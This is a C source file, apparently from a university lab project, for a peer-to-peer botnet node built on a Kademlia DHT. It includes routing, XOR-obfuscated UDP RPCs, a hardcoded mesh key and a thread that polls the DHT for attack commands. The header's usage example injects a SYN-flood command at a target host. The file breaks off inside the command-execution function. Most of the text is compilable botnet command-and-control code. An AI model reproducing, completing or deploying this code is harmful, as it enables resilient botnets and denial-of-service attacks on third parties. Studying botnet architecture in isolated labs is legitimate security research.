/*
 * ====================================================
 *  AUA CS 232/337 - Botnet Research Project
 *  Component: Phase 3 - Kademlia P2P DHT Botnet Node (C)
 *  ISOLATED VM LAB ONLY
 *
 *  Compile:
 *    gcc -o kademlia_p2p kademlia_p2p.c -lpthread -lssl -lcrypto -lm
 *
 *  Usage:
 *    Seed node  : sudo ./kademlia_p2p --host 192.168.100.10 --port 7400
 *    Bot node   : sudo ./kademlia_p2p --host 192.168.100.11 --port 7400 \
 *                   --bootstrap 192.168.100.10:7400
 *    Inject cmd : sudo ./kademlia_p2p --inject \
 *                   '{"type":"syn_flood","target":"192.168.100.20","port":80,"duration":15}' \
 *                   --bootstrap 192.168.100.10:7400
 *    Demo (local): sudo ./kademlia_p2p --demo
 *
 *  Architecture:
 *    - 160-bit node IDs (SHA-1 of host:port)
 *    - XOR distance metric: d(x,y) = x XOR y
 *    - K-buckets (k=8) with Sybil-resistant probe-before-evict
 *    - RPCs: PING, PONG, FIND_NODE, FOUND_NODES, STORE, FIND_VALUE, FOUND_VALUE
 *    - Iterative FIND_NODE / FIND_VALUE (alpha=3 concurrency)
 *    - XOR stream-cipher encryption (matches p2p_node.py)
 *    - Command polling thread — periodically looks up COMMAND_KEY in DHT
 *    - Bucket refresh thread — prevents stale routing tables
 * ====================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <math.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/sha.h>

/* ── Constants ──────────────────────────────────────────────── */
#define ID_BYTES        20          /* 160-bit SHA-1 node ID          */
#define K               8           /* k-bucket capacity              */
#define ALPHA           3           /* concurrency factor for lookups  */
#define BUCKET_COUNT    160         /* one bucket per ID bit position  */
#define MAX_KV_ENTRIES  256         /* local key-value store capacity  */
#define MAX_VALUE_LEN   1024        /* max stored value size           */
#define UDP_BUF         2048        /* UDP receive buffer              */
#define PING_TIMEOUT_MS 2000        /* PING response timeout (ms)      */
#define FIND_TIMEOUT_MS 3000        /* FIND_NODE response timeout (ms) */
#define REFRESH_SEC     300         /* bucket refresh interval         */
#define POLL_SEC        30          /* command poll interval           */
#define MAX_ITER        20          /* max iterative lookup rounds     */

static const char *P2P_SECRET = "AUA_P2P_MESH_KEY";
static const char *COMMAND_KEY = "botnet_command_v1";  /* SHA-1 of this string used as DHT key */

/* ── Message types ──────────────────────────────────────────── */
#define MSG_PING        0x01
#define MSG_PONG        0x02
#define MSG_FIND_NODE   0x03
#define MSG_FOUND_NODES 0x04
#define MSG_STORE       0x05
#define MSG_FIND_VALUE  0x06
#define MSG_FOUND_VALUE 0x07

/* ── Wire format:
 *   [1]  msg_type
 *   [8]  msg_id   (random nonce, used to match responses)
 *   [20] sender_id
 *   [4]  sender_ip  (network byte order)
 *   [2]  sender_port (network byte order)
 *   --- payload depends on type ---
 *   FIND_NODE   : [20] target_id
 *   FOUND_NODES : [1] count, then count*[20+4+2] entries
 *   STORE       : [20] key, [2] val_len, [val_len] value
 *   FIND_VALUE  : [20] key
 *   FOUND_VALUE : [20] key, [2] val_len, [val_len] value
 *   All messages XOR-encrypted with key_stream(SHA256(P2P_SECRET))
 * ────────────────────────────────────────────────────────────── */

#define HDR_SIZE (1 + 8 + ID_BYTES + 4 + 2)   /* 35 bytes */

/* ── Data structures ────────────────────────────────────────── */

typedef uint8_t NodeID[ID_BYTES];

typedef struct {
    NodeID   id;
    uint32_t ip;        /* network byte order */
    uint16_t port;      /* network byte order */
    time_t   last_seen;
    int      fail_count;
} Contact;

typedef struct {
    Contact contacts[K];
    int     count;
    pthread_mutex_t lock;
} KBucket;

typedef struct {
    KBucket  buckets[BUCKET_COUNT];
    NodeID   self_id;
} RoutingTable;

typedef struct {
    uint8_t  key[ID_BYTES];
    char     value[MAX_VALUE_LEN];
    int      value_len;
    time_t   stored_at;
    int      used;
} KVEntry;

typedef struct {
    KVEntry  entries[MAX_KV_ENTRIES];
    pthread_mutex_t lock;
} KVStore;

/* Pending RPC call — used to match async responses */
typedef struct PendingRPC PendingRPC;
struct PendingRPC {
    uint8_t     msg_id[8];
    uint8_t     response_buf[UDP_BUF];
    int         response_len;
    int         done;
    pthread_mutex_t lock;
    pthread_cond_t  cond;
    PendingRPC *next;
};

typedef struct {
    int              sock;
    NodeID           self_id;
    uint32_t         self_ip;
    uint16_t         self_port;
    RoutingTable     routing;
    KVStore          store;
    volatile int     running;
    pthread_t        recv_thread;
    pthread_t        refresh_thread;
    pthread_t        poll_thread;
    PendingRPC      *pending_head;
    pthread_mutex_t  pending_lock;
    /* track executed command hashes to prevent replay */
    uint8_t          exec_hashes[64][ID_BYTES];
    int              exec_count;
} KademliaNode;

/* ── Utility: XOR stream cipher ─────────────────────────────── */
/* Matches p2p_node.py _simple_encrypt / _simple_decrypt         */
static void xor_cipher(const uint8_t *in, uint8_t *out, size_t len) {
    uint8_t key_hash[SHA256_DIGEST_LENGTH];
    SHA256((const uint8_t *)P2P_SECRET, strlen(P2P_SECRET), key_hash);
    for (size_t i = 0; i < len; i++)
        out[i] = in[i] ^ key_hash[i % SHA256_DIGEST_LENGTH];
}

/* ── Utility: SHA-1 of a string → NodeID ───────────────────── */
static void sha1_to_id(const char *input, NodeID out) {
    SHA1((const uint8_t *)input, strlen(input), out);
}

/* ── Utility: node ID from host:port ─────────────────────────  */
static void id_from_host_port(const char *host, uint16_t port, NodeID out) {
    char buf[128];
    snprintf(buf, sizeof(buf), "%s:%u", host, (unsigned)ntohs(port));
    sha1_to_id(buf, out);
}

/* ── Utility: random 8-byte message ID ──────────────────────── */
static void rand_msg_id(uint8_t *out) {
    for (int i = 0; i < 8; i++) out[i] = (uint8_t)(rand() & 0xFF);
}

/* ── Utility: XOR distance for bucket placement ──────────────── */
/* Returns -1 if ids are equal, else the index of the highest    */
/* differing bit (0 = closest bucket, 159 = furthest).           */
static int bucket_index(const NodeID a, const NodeID b) {
    for (int byte = 0; byte < ID_BYTES; byte++) {
        uint8_t diff = a[byte] ^ b[byte];
        if (diff == 0) continue;
        /* find highest bit in diff */
        for (int bit = 7; bit >= 0; bit--) {
            if (diff & (1 << bit))
                return (ID_BYTES - 1 - byte) * 8 + bit;
        }
    }
    return -1; /* identical */
}

/* ── Utility: XOR distance comparison (for sorting) ─────────── */
static int xor_dist_cmp(const NodeID target, const NodeID a, const NodeID b) {
    for (int i = 0; i < ID_BYTES; i++) {
        uint8_t da = target[i] ^ a[i];
        uint8_t db = target[i] ^ b[i];
        if (da < db) return -1;
        if (da > db) return  1;
    }
    return 0;
}

/* ── Routing Table ───────────────────────────────────────────── */
static void routing_init(RoutingTable *rt, const NodeID self_id) {
    memcpy(rt->self_id, self_id, ID_BYTES);
    for (int i = 0; i < BUCKET_COUNT; i++) {
        memset(&rt->buckets[i], 0, sizeof(KBucket));
        pthread_mutex_init(&rt->buckets[i].lock, NULL);
    }
}

/* Returns 1 if added/updated, 0 if bucket full and oldest alive */
static int routing_add(RoutingTable *rt, const Contact *c,
                        KademliaNode *node);   /* forward decl for ping */

static Contact *routing_find_closest_internal(RoutingTable *rt,
                                               const NodeID target,
                                               int n, int *out_count) {
    /* Collect all contacts from all buckets */
    static Contact pool[BUCKET_COUNT * K];
    int total = 0;
    for (int i = 0; i < BUCKET_COUNT; i++) {
        KBucket *b = &rt->buckets[i];
        pthread_mutex_lock(&b->lock);
        for (int j = 0; j < b->count; j++) {
            if (total < BUCKET_COUNT * K)
                pool[total++] = b->contacts[j];
        }
        pthread_mutex_unlock(&b->lock);
    }
    /* Sort by XOR distance to target (insertion sort for small n) */
    for (int i = 1; i < total; i++) {
        Contact tmp = pool[i];
        int j = i - 1;
        while (j >= 0 && xor_dist_cmp(target, pool[j].id, tmp.id) > 0) {
            pool[j+1] = pool[j]; j--;
        }
        pool[j+1] = tmp;
    }
    *out_count = (total < n) ? total : n;
    /* Caller gets a static buffer — not thread-safe for concurrent calls */
    static Contact result[K * 2];
    memcpy(result, pool, (*out_count) * sizeof(Contact));
    return result;
}

/* ── KV Store ────────────────────────────────────────────────── */
static void kvstore_init(KVStore *s) {
    memset(s, 0, sizeof(*s));
    pthread_mutex_init(&s->lock, NULL);
}

static void kvstore_put(KVStore *s, const uint8_t *key, const char *val, int vlen) {
    pthread_mutex_lock(&s->lock);
    /* Update existing entry */
    for (int i = 0; i < MAX_KV_ENTRIES; i++) {
        if (s->entries[i].used && memcmp(s->entries[i].key, key, ID_BYTES) == 0) {
            int copy = (vlen < MAX_VALUE_LEN - 1) ? vlen : MAX_VALUE_LEN - 1;
            memcpy(s->entries[i].value, val, copy);
            s->entries[i].value[copy] = '\0';
            s->entries[i].value_len = copy;
            s->entries[i].stored_at = time(NULL);
            pthread_mutex_unlock(&s->lock);
            return;
        }
    }
    /* Find empty slot */
    for (int i = 0; i < MAX_KV_ENTRIES; i++) {
        if (!s->entries[i].used) {
            memcpy(s->entries[i].key, key, ID_BYTES);
            int copy = (vlen < MAX_VALUE_LEN - 1) ? vlen : MAX_VALUE_LEN - 1;
            memcpy(s->entries[i].value, val, copy);
            s->entries[i].value[copy] = '\0';
            s->entries[i].value_len = copy;
            s->entries[i].stored_at = time(NULL);
            s->entries[i].used = 1;
            pthread_mutex_unlock(&s->lock);
            return;
        }
    }
    pthread_mutex_unlock(&s->lock);
}

static int kvstore_get(KVStore *s, const uint8_t *key, char *out, int out_len) {
    pthread_mutex_lock(&s->lock);
    for (int i = 0; i < MAX_KV_ENTRIES; i++) {
        if (s->entries[i].used && memcmp(s->entries[i].key, key, ID_BYTES) == 0) {
            int copy = (s->entries[i].value_len < out_len - 1)
                       ? s->entries[i].value_len : out_len - 1;
            memcpy(out, s->entries[i].value, copy);
            out[copy] = '\0';
            pthread_mutex_unlock(&s->lock);
            return copy;
        }
    }
    pthread_mutex_unlock(&s->lock);
    return -1;
}

/* ── Wire encoding helpers ───────────────────────────────────── */
static int encode_header(uint8_t *buf, uint8_t type,
                          const uint8_t *msg_id,
                          const NodeID sender_id,
                          uint32_t sender_ip, uint16_t sender_port) {
    buf[0] = type;
    memcpy(buf + 1, msg_id, 8);
    memcpy(buf + 9, sender_id, ID_BYTES);
    memcpy(buf + 29, &sender_ip, 4);
    memcpy(buf + 33, &sender_port, 2);
    return HDR_SIZE;
}

static void decode_header(const uint8_t *buf,
                           uint8_t *type, uint8_t *msg_id,
                           NodeID sender_id,
                           uint32_t *sender_ip, uint16_t *sender_port) {
    *type = buf[0];
    memcpy(msg_id, buf + 1, 8);
    memcpy(sender_id, buf + 9, ID_BYTES);
    memcpy(sender_ip, buf + 29, 4);
    memcpy(sender_port, buf + 33, 2);
}

/* ── Send a raw encrypted UDP message ───────────────────────── */
static void send_msg(int sock, const uint8_t *raw, int len,
                     uint32_t dst_ip, uint16_t dst_port) {
    uint8_t enc[UDP_BUF];
    if (len > (int)sizeof(enc)) return;
    xor_cipher(raw, enc, len);
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = dst_ip;
    dst.sin_port        = dst_port;
    sendto(sock, enc, len, 0, (struct sockaddr *)&dst, sizeof(dst));
}

/* ── Pending RPC management ──────────────────────────────────── */
static PendingRPC *pending_new(const uint8_t *msg_id) {
    PendingRPC *p = calloc(1, sizeof(PendingRPC));
    if (!p) return NULL;
    memcpy(p->msg_id, msg_id, 8);
    pthread_mutex_init(&p->lock, NULL);
    pthread_cond_init(&p->cond, NULL);
    return p;
}

static void pending_add(KademliaNode *n, PendingRPC *p) {
    pthread_mutex_lock(&n->pending_lock);
    p->next = n->pending_head;
    n->pending_head = p;
    pthread_mutex_unlock(&n->pending_lock);
}

static void pending_remove(KademliaNode *n, PendingRPC *p) {
    pthread_mutex_lock(&n->pending_lock);
    PendingRPC **cur = &n->pending_head;
    while (*cur) {
        if (*cur == p) { *cur = p->next; break; }
        cur = &(*cur)->next;
    }
    pthread_mutex_unlock(&n->pending_lock);
}

/* Block until response arrives or timeout (ms). Returns 1 if got response. */
static int pending_wait(PendingRPC *p, int timeout_ms) {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec  += timeout_ms / 1000;
    ts.tv_nsec += (timeout_ms % 1000) * 1000000L;
    if (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
    pthread_mutex_lock(&p->lock);
    while (!p->done)
        if (pthread_cond_timedwait(&p->cond, &p->lock, &ts) == ETIMEDOUT) break;
    int got = p->done;
    pthread_mutex_unlock(&p->lock);
    return got;
}

/* ── PING RPC ────────────────────────────────────────────────── */
static int kademlia_ping(KademliaNode *n, uint32_t dst_ip, uint16_t dst_port) {
    uint8_t msg_id[8]; rand_msg_id(msg_id);
    uint8_t buf[HDR_SIZE];
    encode_header(buf, MSG_PING, msg_id, n->self_id, n->self_ip, n->self_port);

    PendingRPC *p = pending_new(msg_id);
    if (!p) return 0;
    pending_add(n, p);
    send_msg(n->sock, buf, HDR_SIZE, dst_ip, dst_port);
    int got = pending_wait(p, PING_TIMEOUT_MS);
    pending_remove(n, p);
    pthread_mutex_destroy(&p->lock);
    pthread_cond_destroy(&p->cond);
    free(p);
    return got;
}

/* ── FIND_NODE RPC ───────────────────────────────────────────── */
/* Returns number of contacts written into out_contacts           */
static int kademlia_find_node_rpc(KademliaNode *n, uint32_t dst_ip, uint16_t dst_port,
                                   const NodeID target, Contact *out_contacts, int max) {
    uint8_t msg_id[8]; rand_msg_id(msg_id);
    uint8_t buf[HDR_SIZE + ID_BYTES];
    int off = encode_header(buf, MSG_FIND_NODE, msg_id, n->self_id, n->self_ip, n->self_port);
    memcpy(buf + off, target, ID_BYTES);

    PendingRPC *p = pending_new(msg_id);
    if (!p) return 0;
    pending_add(n, p);
    send_msg(n->sock, buf, HDR_SIZE + ID_BYTES, dst_ip, dst_port);
    int got = pending_wait(p, FIND_TIMEOUT_MS);
    int count = 0;
    if (got && p->response_len >= HDR_SIZE + 1) {
        uint8_t *payload = p->response_buf + HDR_SIZE;
        int n_entries = payload[0];
        for (int i = 0; i < n_entries && i < max; i++) {
            uint8_t *entry = payload + 1 + i * (ID_BYTES + 4 + 2);
            if ((entry + ID_BYTES + 6) > (p->response_buf + p->response_len)) break;
            memcpy(out_contacts[count].id, entry, ID_BYTES);
            memcpy(&out_contacts[count].ip,   entry + ID_BYTES,     4);
            memcpy(&out_contacts[count].port, entry + ID_BYTES + 4, 2);
            out_contacts[count].last_seen = time(NULL);
            out_contacts[count].fail_count = 0;
            count++;
        }
    }
    pending_remove(n, p);
    pthread_mutex_destroy(&p->lock);
    pthread_cond_destroy(&p->cond);
    free(p);
    return count;
}

/* ── STORE RPC ───────────────────────────────────────────────── */
static int kademlia_store_rpc(KademliaNode *n, uint32_t dst_ip, uint16_t dst_port,
                               const uint8_t *key, const char *value, int val_len) {
    uint8_t msg_id[8]; rand_msg_id(msg_id);
    uint16_t vlen_net = htons((uint16_t)val_len);
    int total = HDR_SIZE + ID_BYTES + 2 + val_len;
    uint8_t *buf = malloc(total);
    if (!buf) return 0;
    int off = encode_header(buf, MSG_STORE, msg_id, n->self_id, n->self_ip, n->self_port);
    memcpy(buf + off, key, ID_BYTES);      off += ID_BYTES;
    memcpy(buf + off, &vlen_net, 2);       off += 2;
    memcpy(buf + off, value, val_len);

    PendingRPC *p = pending_new(msg_id);
    if (!p) { free(buf); return 0; }
    pending_add(n, p);
    send_msg(n->sock, buf, total, dst_ip, dst_port);
    free(buf);
    int got = pending_wait(p, PING_TIMEOUT_MS);
    pending_remove(n, p);
    pthread_mutex_destroy(&p->lock);
    pthread_cond_destroy(&p->cond);
    free(p);
    return got;
}

/* ── FIND_VALUE RPC ──────────────────────────────────────────── */
/* Returns 1 + fills value_out if value found; 0 + fills contacts_out if not */
static int kademlia_find_value_rpc(KademliaNode *n, uint32_t dst_ip, uint16_t dst_port,
                                    const uint8_t *key,
                                    char *value_out, int val_max,
                                    Contact *contacts_out, int *n_contacts) {
    uint8_t msg_id[8]; rand_msg_id(msg_id);
    uint8_t buf[HDR_SIZE + ID_BYTES];
    int off = encode_header(buf, MSG_FIND_VALUE, msg_id, n->self_id, n->self_ip, n->self_port);
    memcpy(buf + off, key, ID_BYTES);

    PendingRPC *p = pending_new(msg_id);
    if (!p) return 0;
    pending_add(n, p);
    send_msg(n->sock, buf, HDR_SIZE + ID_BYTES, dst_ip, dst_port);
    int got = pending_wait(p, FIND_TIMEOUT_MS);
    int found = 0;
    if (got) {
        uint8_t type = p->response_buf[0];
        uint8_t *payload = p->response_buf + HDR_SIZE;
        if (type == MSG_FOUND_VALUE) {
            /* [20 key][2 len][value] */
            uint16_t vlen;
            memcpy(&vlen, payload + ID_BYTES, 2); vlen = ntohs(vlen);
            int copy = (vlen < (uint16_t)val_max - 1) ? vlen : val_max - 1;
            memcpy(value_out, payload + ID_BYTES + 2, copy);
            value_out[copy] = '\0';
            found = 1;
        } else if (type == MSG_FOUND_NODES && n_contacts && contacts_out) {
            int cnt = payload[0];
            *n_contacts = 0;
            for (int i = 0; i < cnt; i++) {
                uint8_t *e = payload + 1 + i * (ID_BYTES + 4 + 2);
                if ((e + ID_BYTES + 6) > (p->response_buf + p->response_len)) break;
                memcpy(contacts_out[*n_contacts].id, e, ID_BYTES);
                memcpy(&contacts_out[*n_contacts].ip,   e + ID_BYTES,     4);
                memcpy(&contacts_out[*n_contacts].port, e + ID_BYTES + 4, 2);
                contacts_out[*n_contacts].last_seen = time(NULL);
                (*n_contacts)++;
            }
        }
    }
    pending_remove(n, p);
    pthread_mutex_destroy(&p->lock);
    pthread_cond_destroy(&p->cond);
    free(p);
    return found;
}

/* ── Routing table add (with Sybil-resistant probe-before-evict) */
static int routing_add(RoutingTable *rt, const Contact *c, KademliaNode *node) {
    if (memcmp(c->id, rt->self_id, ID_BYTES) == 0) return 0;
    int idx = bucket_index(rt->self_id, c->id);
    if (idx < 0 || idx >= BUCKET_COUNT) return 0;
    KBucket *b = &rt->buckets[idx];
    pthread_mutex_lock(&b->lock);
    /* Already present — update recency */
    for (int i = 0; i < b->count; i++) {
        if (memcmp(b->contacts[i].id, c->id, ID_BYTES) == 0) {
            b->contacts[i].last_seen  = time(NULL);
            b->contacts[i].fail_count = 0;
            pthread_mutex_unlock(&b->lock);
            return 1;
        }
    }
    /* Space available */
    if (b->count < K) {
        b->contacts[b->count++] = *c;
        pthread_mutex_unlock(&b->lock);
        return 1;
    }
    /* Bucket full — probe oldest (index 0) */
    Contact oldest = b->contacts[0];
    pthread_mutex_unlock(&b->lock);
    int alive = kademlia_ping(node, oldest.ip, oldest.port);
    pthread_mutex_lock(&b->lock);
    if (alive) {
        /* Oldest is alive — move to end, discard new contact */
        Contact tmp = b->contacts[0];
        memmove(b->contacts, b->contacts + 1, (K-1) * sizeof(Contact));
        b->contacts[K-1] = tmp;
        b->contacts[K-1].last_seen = time(NULL);
        pthread_mutex_unlock(&b->lock);
        return 0;
    }
    /* Oldest is dead — evict it, add new */
    memmove(b->contacts, b->contacts + 1, (K-1) * sizeof(Contact));
    b->contacts[K-1] = *c;
    pthread_mutex_unlock(&b->lock);
    return 1;
}

/* ── Iterative FIND_NODE ─────────────────────────────────────── */
static int iterative_find_node(KademliaNode *n, const NodeID target,
                                Contact *result, int max) {
    Contact closest[K * 2];
    int n_closest = 0;
    Contact *raw = routing_find_closest_internal(&n->routing, target, K, &n_closest);
    memcpy(closest, raw, n_closest * sizeof(Contact));

    uint8_t queried_ids[BUCKET_COUNT * K][ID_BYTES];
    int n_queried = 0;

    for (int iter = 0; iter < MAX_ITER; iter++) {
        /* Pick ALPHA un-queried contacts */
        Contact to_query[ALPHA]; int q_count = 0;
        for (int i = 0; i < n_closest && q_count < ALPHA; i++) {
            int already = 0;
            for (int j = 0; j < n_queried; j++) {
                if (memcmp(queried_ids[j], closest[i].id, ID_BYTES) == 0) { already=1; break; }
            }
            if (!already) to_query[q_count++] = closest[i];
        }
        if (q_count == 0) break;

        /* Query each — single-threaded for simplicity in C */
        Contact new_contacts[K * ALPHA]; int new_count = 0;
        for (int i = 0; i < q_count; i++) {
            if (n_queried < BUCKET_COUNT * K)
                memcpy(queried_ids[n_queried++], to_query[i].id, ID_BYTES);
            Contact batch[K]; int got = 0;
            got = kademlia_find_node_rpc(n, to_query[i].ip, to_query[i].port, target, batch, K);
            for (int j = 0; j < got && new_count < K*ALPHA; j++) {
                new_contacts[new_count++] = batch[j];
                routing_add(&n->routing, &batch[j], n);
            }
        }
        if (new_count == 0) break;
        /* Merge new contacts into closest, keep K closest */
        for (int i = 0; i < new_count; i++) {
            /* Check if already in closest */
            int dup = 0;
            for (int j = 0; j < n_closest; j++) {
                if (memcmp(closest[j].id, new_contacts[i].id, ID_BYTES) == 0) { dup=1; break; }
            }
            if (!dup && n_closest < K*2) closest[n_closest++] = new_contacts[i];
        }
        /* Sort by XOR distance */
        for (int i = 1; i < n_closest; i++) {
            Contact tmp = closest[i]; int j = i-1;
            while (j >= 0 && xor_dist_cmp(target, closest[j].id, tmp.id) > 0) {
                closest[j+1] = closest[j]; j--;
            }
            closest[j+1] = tmp;
        }
        if (n_closest > K) n_closest = K;
    }
    int out = (n_closest < max) ? n_closest : max;
    memcpy(result, closest, out * sizeof(Contact));
    return out;
}

/* ── Iterative FIND_VALUE ────────────────────────────────────── */
static int iterative_find_value(KademliaNode *n, const uint8_t *key,
                                 char *value_out, int val_max) {
    /* Hash the key string to NodeID for routing */
    NodeID target; memcpy(target, key, ID_BYTES);

    Contact closest[K * 2]; int n_closest = 0;
    Contact *raw = routing_find_closest_internal(&n->routing, target, K, &n_closest);
    memcpy(closest, raw, n_closest * sizeof(Contact));

    uint8_t queried_ids[BUCKET_COUNT * K][ID_BYTES];
    int n_queried = 0;

    for (int iter = 0; iter < MAX_ITER; iter++) {
        Contact to_query[ALPHA]; int q_count = 0;
        for (int i = 0; i < n_closest && q_count < ALPHA; i++) {
            int already = 0;
            for (int j = 0; j < n_queried; j++) {
                if (memcmp(queried_ids[j], closest[i].id, ID_BYTES) == 0) { already=1; break; }
            }
            if (!already) to_query[q_count++] = closest[i];
        }
        if (q_count == 0) break;

        for (int i = 0; i < q_count; i++) {
            if (n_queried < BUCKET_COUNT * K)
                memcpy(queried_ids[n_queried++], to_query[i].id, ID_BYTES);
            Contact closer[K]; int n_closer = 0;
            char found_val[MAX_VALUE_LEN];
            int found = kademlia_find_value_rpc(n, to_query[i].ip, to_query[i].port,
                                                 key, found_val, MAX_VALUE_LEN,
                                                 closer, &n_closer);
            if (found) {
                int copy = (int)strlen(found_val);
                if (copy > val_max - 1) copy = val_max - 1;
                memcpy(value_out, found_val, copy);
                value_out[copy] = '\0';
                return 1;
            }
            for (int j = 0; j < n_closer; j++) {
                routing_add(&n->routing, &closer[j], n);
                int dup = 0;
                for (int k2 = 0; k2 < n_closest; k2++) {
                    if (memcmp(closest[k2].id, closer[j].id, ID_BYTES) == 0) { dup=1; break; }
                }
                if (!dup && n_closest < K*2) closest[n_closest++] = closer[j];
            }
        }
        /* Sort */
        for (int i = 1; i < n_closest; i++) {
            Contact tmp = closest[i]; int j = i-1;
            while (j >= 0 && xor_dist_cmp(target, closest[j].id, tmp.id) > 0) {
                closest[j+1] = closest[j]; j--;
            }
            closest[j+1] = tmp;
        }
        if (n_closest > K) n_closest = K;
    }
    return 0;
}

/* ── Store value across the K closest nodes ─────────────────── */
static int store_value(KademliaNode *n, const uint8_t *key,
                        const char *value, int val_len) {
    /* Store locally first */
    kvstore_put(&n->store, key, value, val_len);
    /* Find K closest nodes and store on them */
    NodeID target; memcpy(target, key, ID_BYTES);
    Contact recipients[K]; int n_recip = 0;
    n_recip = iterative_find_node(n, target, recipients, K);
    int acks = 0;
    for (int i = 0; i < n_recip; i++) {
        if (kademlia_store_rpc(n, recipients[i].ip, recipients[i].port,
                                key, value, val_len)) acks++;
    }
    printf("[P2P] Stored value on %d/%d nodes\n", acks, n_recip);
    return acks;
}

/* ── Handle incoming RPC ─────────────────────────────────────── */
static void handle_incoming(KademliaNode *n, const uint8_t *buf, int len,
                              struct sockaddr_in *src_addr) {
    if (len < HDR_SIZE) return;
    uint8_t type, msg_id[8];
    NodeID sender_id;
    uint32_t sender_ip; uint16_t sender_port;
    decode_header(buf, &type, msg_id, sender_id, &sender_ip, &sender_port);

    /* Add sender to routing table */
    Contact c;
    memcpy(c.id, sender_id, ID_BYTES);
    c.ip = sender_ip; c.port = sender_port;
    c.last_seen = time(NULL); c.fail_count = 0;
    routing_add(&n->routing, &c, n);

    const uint8_t *payload = buf + HDR_SIZE;
    int plen = len - HDR_SIZE;

    if (type == MSG_PING) {
        uint8_t resp[HDR_SIZE];
        encode_header(resp, MSG_PONG, msg_id, n->self_id, n->self_ip, n->self_port);
        send_msg(n->sock, resp, HDR_SIZE, sender_ip, sender_port);

    } else if (type == MSG_FIND_NODE && plen >= ID_BYTES) {
        NodeID target; memcpy(target, payload, ID_BYTES);
        Contact found[K]; int n_found = 0;
        Contact *raw = routing_find_closest_internal(&n->routing, target, K, &n_found);
        /* Build FOUND_NODES response */
        int resp_size = HDR_SIZE + 1 + n_found * (ID_BYTES + 4 + 2);
        uint8_t *resp = malloc(resp_size);
        if (!resp) return;
        encode_header(resp, MSG_FOUND_NODES, msg_id, n->self_id, n->self_ip, n->self_port);
        resp[HDR_SIZE] = (uint8_t)n_found;
        for (int i = 0; i < n_found; i++) {
            uint8_t *e = resp + HDR_SIZE + 1 + i * (ID_BYTES + 4 + 2);
            memcpy(e, raw[i].id, ID_BYTES);
            memcpy(e + ID_BYTES,     &raw[i].ip,   4);
            memcpy(e + ID_BYTES + 4, &raw[i].port, 2);
        }
        send_msg(n->sock, resp, resp_size, sender_ip, sender_port);
        free(resp);
        (void)found;

    } else if (type == MSG_STORE && plen >= ID_BYTES + 2) {
        uint8_t key[ID_BYTES]; memcpy(key, payload, ID_BYTES);
        uint16_t vlen_net; memcpy(&vlen_net, payload + ID_BYTES, 2);
        uint16_t vlen = ntohs(vlen_net);
        if (plen >= ID_BYTES + 2 + vlen) {
            kvstore_put(&n->store, key, (const char *)(payload + ID_BYTES + 2), vlen);
        }
        uint8_t resp[HDR_SIZE];
        encode_header(resp, MSG_PONG, msg_id, n->self_id, n->self_ip, n->self_port);
        send_msg(n->sock, resp, HDR_SIZE, sender_ip, sender_port);

    } else if (type == MSG_FIND_VALUE && plen >= ID_BYTES) {
        uint8_t key[ID_BYTES]; memcpy(key, payload, ID_BYTES);
        char value[MAX_VALUE_LEN];
        int vlen = kvstore_get(&n->store, key, value, MAX_VALUE_LEN);
        if (vlen > 0) {
            /* Found locally — reply FOUND_VALUE */
            uint16_t vlen_net = htons((uint16_t)vlen);
            int resp_size = HDR_SIZE + ID_BYTES + 2 + vlen;
            uint8_t *resp = malloc(resp_size);
            if (!resp) return;
            int off = encode_header(resp, MSG_FOUND_VALUE, msg_id, n->self_id, n->self_ip, n->self_port);
            memcpy(resp + off, key, ID_BYTES); off += ID_BYTES;
            memcpy(resp + off, &vlen_net, 2);  off += 2;
            memcpy(resp + off, value, vlen);
            send_msg(n->sock, resp, resp_size, sender_ip, sender_port);
            free(resp);
        } else {
            /* Not found — reply with FOUND_NODES (closest we have) */
            NodeID target; memcpy(target, key, ID_BYTES);
            int n_found = 0;
            Contact *raw = routing_find_closest_internal(&n->routing, target, K, &n_found);
            int resp_size = HDR_SIZE + 1 + n_found * (ID_BYTES + 4 + 2);
            uint8_t *resp = malloc(resp_size);
            if (!resp) return;
            encode_header(resp, MSG_FOUND_NODES, msg_id, n->self_id, n->self_ip, n->self_port);
            resp[HDR_SIZE] = (uint8_t)n_found;
            for (int i = 0; i < n_found; i++) {
                uint8_t *e = resp + HDR_SIZE + 1 + i * (ID_BYTES + 4 + 2);
                memcpy(e, raw[i].id, ID_BYTES);
                memcpy(e + ID_BYTES, &raw[i].ip, 4);
                memcpy(e + ID_BYTES + 4, &raw[i].port, 2);
            }
            send_msg(n->sock, resp, resp_size, sender_ip, sender_port);
            free(resp);
        }
    }
}

/* ── Receive loop thread ─────────────────────────────────────── */
static void *recv_loop(void *arg) {
    KademliaNode *n = (KademliaNode *)arg;
    uint8_t enc_buf[UDP_BUF], dec_buf[UDP_BUF];
    struct sockaddr_in src;
    socklen_t src_len = sizeof(src);
    while (n->running) {
        int r = recvfrom(n->sock, enc_buf, UDP_BUF, 0,
                          (struct sockaddr *)&src, &src_len);
        if (r <= 0) continue;
        xor_cipher(enc_buf, dec_buf, r);
        if (r < HDR_SIZE) continue;
        /* Check if it matches a pending RPC */
        uint8_t msg_id[8]; memcpy(msg_id, dec_buf + 1, 8);
        int matched = 0;
        pthread_mutex_lock(&n->pending_lock);
        for (PendingRPC *p = n->pending_head; p; p = p->next) {
            if (memcmp(p->msg_id, msg_id, 8) == 0) {
                pthread_mutex_lock(&p->lock);
                memcpy(p->response_buf, dec_buf, r);
                p->response_len = r;
                p->done = 1;
                pthread_cond_signal(&p->cond);
                pthread_mutex_unlock(&p->lock);
                matched = 1; break;
            }
        }
        pthread_mutex_unlock(&n->pending_lock);
        if (!matched) handle_incoming(n, dec_buf, r, &src);
    }
    return NULL;
}

/* ── Command execution ───────────────────────────────────────── */
/* Executes attacks found in DHT by spawning Python scripts       */
static void execute_command(const char *cmd_json) {
    /* Extract type field */
    char type[32] = {0};
    const char *tp = strstr(cmd_json, "\"type\"");
    if (tp) {
        tp = strchr(tp + 6, '"');
        if (tp) { tp++; sscanf(tp, "%31[^\"]", type); }
    }
    printf("\n[P2P] *** COMMAND RECEIVED from DHT ***\n");
